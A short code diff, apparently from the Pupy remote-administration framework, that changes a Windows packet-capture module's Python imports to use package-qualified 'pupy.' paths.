@@ -6,10 +6,10 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
-from modules.lib.windows.winpcap import init_winpcap
-from pupylib.utils.rpyc_utils import redirected_stdo
+from pupy.modules.lib.windows.winpcap import init_winpcap
+from pupy.pupylib.utils.rpyc_utils import redirected_stdo
 
-from pupylib.PupyModule import (
+from pupy.pupylib.PupyModule import (
     config, PupyModule,
     QA_DANGEROUS, PupyArgumentParser,
     REQUIRE_STREAM
